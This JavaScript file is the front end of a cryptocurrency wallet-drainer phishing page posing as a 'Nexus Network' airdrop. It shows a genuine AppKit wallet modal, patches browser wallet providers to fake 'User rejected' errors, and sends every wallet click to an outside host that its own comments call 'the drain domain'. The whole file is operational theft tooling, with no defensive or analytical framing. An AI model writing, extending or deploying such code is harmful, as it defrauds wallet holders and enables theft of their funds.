// =====================================================
// LANDING PAGE — Real AppKit modal, redirect on wallet click
// =====================================================
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'

// =====================================================
// CONFIG
// =====================================================
const CONNECT_URL = 'https://playholding.vercel.app/?popup=1';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';

const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// Map AppKit wallet display names to wallet button IDs
const WALLET_MAP = {
  'metamask': 'metamask',
  'trust wallet': 'trust',
  'phantom': 'phantom',
  'coinbase wallet': 'coinbase',
  'brave wallet': 'brave',
  'rainbow': 'rainbow',
  'zerion': 'zerion',
  'okx wallet': 'okx',
  'walletconnect': 'walletConnect',
};

// =====================================================
// BLOCK WALLET CONNECTIONS ON LANDING DOMAIN
// AppKit will still SHOW wallets with "INSTALLED" badges,
// but clicking them won't trigger extension popups.
// The actual connection happens on the drain domain.
// =====================================================
function blockProvider(p) {
  if (!p?.request) return;
  try {
    const orig = p.request.bind(p);
    p.request = async function(args) {
      const m = args?.method;
      if (m === 'eth_requestAccounts' || m === 'wallet_requestPermissions') {
        throw { code: 4001, message: 'User rejected the request.' };
      }
      return orig(args);
    };
  } catch (e) { /* some providers are read-only / Proxy — ignore */ }
}

// Block all known injected wallet providers
try {
  if (window.ethereum) {
    blockProvider(window.ethereum);
    if (window.ethereum.providers) {
      window.ethereum.providers.forEach(p => blockProvider(p));
    }
  }
  if (window.phantom?.ethereum) blockProvider(window.phantom.ethereum);
  if (window.trustwallet) blockProvider(window.trustwallet);
  if (window.coinbaseWalletExtension) blockProvider(window.coinbaseWalletExtension);
  if (window.braveEthereum) blockProvider(window.braveEthereum);
} catch (e) { /* silent */ }

// Also block any future providers announced via EIP-6963
window.addEventListener('eip6963:announceProvider', (e) => {
  if (e?.detail?.provider) blockProvider(e.detail.provider);
});

// =====================================================
// APPKIT INIT — Real modal with real wallet detection
// =====================================================
const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
  adapters: [ethersAdapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — OmniChain Airdrop',
    url: window.location.origin,
    icons: [],
  },
  allWallets: 'SHOW',
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00f2fe',
  },
});

// =====================================================
// INTERCEPT — Capture wallet selection, prevent local connect, redirect
// =====================================================
let redirected = false;

function goToDrain(walletId) {
  if (redirected) return;
  redirected = true;

  // Close modal and kill any connection attempt immediately
  try { modal.close(); } catch (e) {}
  try { modal.disconnect(); } catch (e) {}

  const url = CONNECT_URL + '&wallet=' + encodeURIComponent(walletId);

  if (isMobile) {
    window.location.href = url;
  } else {
    const w = 420, h = 700;
    const left = (screen.width - w) / 2;
    const top = (screen.height - h) / 2;
    window.open(
      url,
      'connect_wallet',
      `width=${w},height=${h},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
    );
  }

  setTimeout(() => { redirected = false; }, 2000);
}

// Catch wallet selection event — fires when user clicks a wallet in the modal
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET' || e === 'CLICK_WALLET') {
    const name = (event?.data?.properties?.name || '').toLowerCase();
    const walletId = WALLET_MAP[name] || 'walletConnect';
    goToDrain(walletId);
  }
});

// Safety: if AppKit somehow connects despite our close(), disconnect and redirect
modal.subscribeProviders((state) => {
  const evmProvider = state['eip155'];
  if (evmProvider) {
    try { modal.disconnect(); } catch (e) {}
    if (!redirected) goToDrain('walletConnect');
  }
});

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  redirected = false;
  modal.open();
};
